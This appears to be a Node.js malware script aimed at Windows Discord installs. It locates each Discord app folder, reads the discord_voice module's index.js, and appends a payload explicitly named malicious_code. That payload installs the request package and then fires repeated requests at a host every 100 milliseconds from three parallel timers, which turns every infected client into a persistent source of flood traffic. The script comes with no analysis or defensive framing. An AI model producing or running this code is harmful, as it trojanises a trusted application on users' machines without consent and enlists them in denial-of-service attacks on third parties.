//Dependencies
const Fs = require("fs")
const Os = require("os")

//Variables
var malicious_code = `ChildProcess.exec("npm install request", function(err,stdout, stderr){
	if(err){ return }
	console.log("Request installed.")
	
	setInterval(function(){
		require("request").get("https://example.com", function(err, res, body){
			if(err){}
			
			console.log(res.statusCode)
		})
	}, 100)
	
	setInterval(function(){
		require("request").get("https://example.com", function(err, res, body){
			if(err){}
			
			console.log(res.statusCode)
		})
	}, 100)
	
		setInterval(function(){
		require("request").get("https://example.com", function(err, res, body){
			if(err){}
			
			console.log(res.statusCode)
		})
	}, 100)
})`

//Main
if(Fs.existsSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord`)){
    const Directories = source => Fs.readdirSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord`, { withFileTypes: true }).filter(dirent => dirent.isDirectory()).map(dirent => dirent.name)

    Directories().forEach(directory =>{
        if(directory.indexOf("app") != -1){
            Fs.readFile(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord\\${directory}\\modules\\discord_voice-6\\discord_voice\\index.js`, "utf8", function(err, data){
                if(err){
                    process.exit()
                }
        
                if(data.indexOf("request") != -1){
                    process.exit()
                }
        
                data += `\n${malicious_code}`
        
                Fs.writeFileSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord\\${directory}\\modules\\discord_voice-6\\discord_voice\\index.js`, data, "utf8")
            })
        }
    })
}
